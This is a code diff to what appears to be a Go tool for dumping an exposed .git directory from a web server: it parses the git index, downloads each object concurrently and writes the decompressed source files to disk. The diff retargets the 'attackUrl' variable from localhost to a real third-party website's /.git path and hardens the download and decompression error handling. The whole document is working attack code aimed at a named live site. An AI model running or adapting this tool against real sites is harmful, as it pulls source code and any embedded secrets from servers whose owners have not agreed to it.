@@ -6,6 +6,7 @@ import (
     "sync"
     "runtime"
     "strings"
+    "errors"
     "bytes"
     "net/url"
     "net/http"
@@ -15,7 +16,7 @@ import (
 )
 
 var (
-    attackUrl string = "http://localhost/.git"
+    attackUrl string = "http://bbs.17k.com/.git"
     wg sync.WaitGroup
 )
 
@@ -61,7 +62,9 @@ type ceBody struct {
 
 func HttpGet(url string) []byte {
     resp, err := http.Get(url)
-    if err != nil {}
+    if err != nil {
+        return make([]byte, 1)
+    }
 
     defer resp.Body.Close()
     body, err := ioutil.ReadAll(resp.Body)
@@ -111,16 +114,6 @@ func Bytes2Sha1(bytes [20]byte) (string,string) {
     return prefix,suffix
 }
 
-func UnzipBytes(input []byte) []byte {
-    b := bytes.NewReader(input)
-    r, err := zlib.NewReader(b)
-    defer r.Close()
-    if err != nil {
-        panic(err)
-    }
-    data, _ := ioutil.ReadAll(r)
-    return data
-}
 
 func SplitFunc(s rune) bool {
     if s == '/' { return true }
@@ -154,16 +147,32 @@ func GetObject(cb ceBody) []byte {
     return HttpGet(url)
 }
 
+func UnzipBytes(input []byte) ([]byte, error) {
+    b := bytes.NewReader(input)
+    r, err := zlib.NewReader(b)
+    if err != nil {
+        return input, errors.New("解压失败")
+    }
+    defer r.Close()
+    data, err := ioutil.ReadAll(r)
+    return data, err
+}
+
 func Write(path string, content []byte, length int) {
     MkdirFromPath(path)
-    if err := ioutil.WriteFile(path, UnzipBytes(content)[length:], 0777); err != nil {
-        fmt.Println(err)
+    if data, err := UnzipBytes(content); err == nil {
+        if err := ioutil.WriteFile(path, data[length:], 0777); err != nil {
+            fmt.Println(err)
+        } else {
+            fmt.Printf("%s OK\n", path)
+        }
+    } else {
+        fmt.Printf("%s %s\n", path, err)
     }
 }
 
 func TaskFunc(cb ceBody) {
     defer wg.Done()
-
     zipBytes := GetObject(cb)
     blobHeadLen := GetBlobHeadLen(cb)
     Write(cb.Name, zipBytes, blobHeadLen)
@@ -175,10 +184,11 @@ func ParseIndex(index []byte) {
     var thisEntrySize int
     binary.Read(bytes.NewBuffer(index), binary.BigEndian, &h)
 
-    runtime.GOMAXPROCS(20) /*协程数量*/
+    runtime.GOMAXPROCS(10) /*协程数量*/
 
     var offset int = headSize
     if CheckSign(h.Sign[:]) && CheckVersion(h.Version) {
+        fmt.Println(h.EntryNum)
         for i := 0; i < int(h.EntryNum); i++ {
             thisEntrySize = entrySize
             binary.Read(bytes.NewBuffer(index[offset:]), binary.BigEndian, &thisEntryBody)
@@ -190,7 +200,7 @@ func ParseIndex(index []byte) {
                 PadEntry(index, &offset, thisEntrySize) /*每个entry都为8的整数倍*/
                 entry := ceBody{thisEntryBody, thisEntrySize, thisEntryName}
                 wg.Add(1)
-                fmt.Println(thisEntryName)
+                //fmt.Println(thisEntryName)
                 go TaskFunc(entry)
             } else { /* good luck */}
         }
